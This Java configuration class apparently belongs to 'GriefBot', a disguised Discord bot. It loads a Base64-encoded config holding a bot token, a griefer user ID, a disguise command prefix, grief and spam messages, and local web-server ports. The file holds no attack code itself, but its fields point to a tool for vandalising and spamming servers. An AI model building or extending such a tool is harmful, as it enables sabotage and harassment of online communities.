package de.corruptedbytes.utils;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Base64;

import org.json.JSONObject;

import de.corruptedbytes.GriefBot;

public class Config {
	
	public final static File WEB_DIRECTORY = new File("web/");
	public final static File CONFIG_FILE = new File("config.dgb");
	public final static File SERVER_FILE = new File("server.json");
	
	public static void initConfig() throws IOException {
		String configFileString = new String(Base64.getDecoder().decode(getConfig(CONFIG_FILE)), StandardCharsets.UTF_8);

		JSONObject jsonObject = new JSONObject(configFileString);
		
		GriefBot.getInstance().setDiscordBotToken(jsonObject.getString("botToken"));
		GriefBot.getInstance().setGrieferUserID(jsonObject.getString("userID"));
		GriefBot.getInstance().setActivityDescription(jsonObject.getString("activityDescription"));
		GriefBot.getInstance().setDisguiseCommandPrefix(jsonObject.getString("disguiseCommandPrefix"));
		GriefBot.getInstance().setGriefCommand(jsonObject.getString("griefCommand"));
		GriefBot.getInstance().setGriefMessage(jsonObject.getString("griefMessage"));
		GriefBot.getInstance().setSpamMessage(jsonObject.getString("spamMessage"));
		GriefBot.getInstance().setGriefPicture(jsonObject.getString("griefPicture"));
	}
	
	public static void initServerConfig() throws Exception {
		if (SERVER_FILE.exists()) {
			JSONObject jsonObject = new JSONObject(getConfig(SERVER_FILE));
			String[] host = jsonObject.getString("webServerSocket").split("\\:");
			
			GriefBot.getInstance().setWebServerPort(jsonObject.getInt("webServerPort"));
			GriefBot.getInstance().setWebSocketServerPort(new InetSocketAddress(InetAddress.getByName(host[0]), Integer.parseInt(host[1])));
			exportWebFiles();
		} else {
			createServerConfig();
			initServerConfig();
		}
	}
	
	public static void exportWebFiles() throws Exception {
		if (!(WEB_DIRECTORY.exists() && WEB_DIRECTORY.isDirectory())) {
			WEB_DIRECTORY.mkdir();
			
			File zipFile = new File(WEB_DIRECTORY + "/web.zip");
			FileUtils.exportFile("web.zip", zipFile);
			FileUtils.extractZip(zipFile, WEB_DIRECTORY);
			
		}
		
//		BufferedWriter writer = new BufferedWriter(new FileWriter(WEB_DIRECTORY + File.separator + "public/websocketserver.dgb", false));
//		writer.write(GriefBot.getInstance().getWebSocketServer().getAddress().getHostAddress() + ":" + GriefBot.getInstance().getWebSocketServer().getPort());
//		writer.close();
	}
	
	private static void createServerConfig() throws IOException {
		JSONObject jsonObject = new JSONObject();
		jsonObject.put("webServerPort", 85);
		jsonObject.put("webServerSocket", ConnectionUtils.lookupLocalAddress() + ":" + 84);
		
		BufferedWriter writer = new BufferedWriter(new FileWriter(SERVER_FILE, false));
	    writer.write(jsonObject.toString());
	    writer.close();
	}
	
	public static String getConfig(File file) {
		try {
			return new String(Files.readAllBytes(file.toPath()), StandardCharsets.UTF_8);
		} catch (Exception ignored) { }
		return "";
	}
}
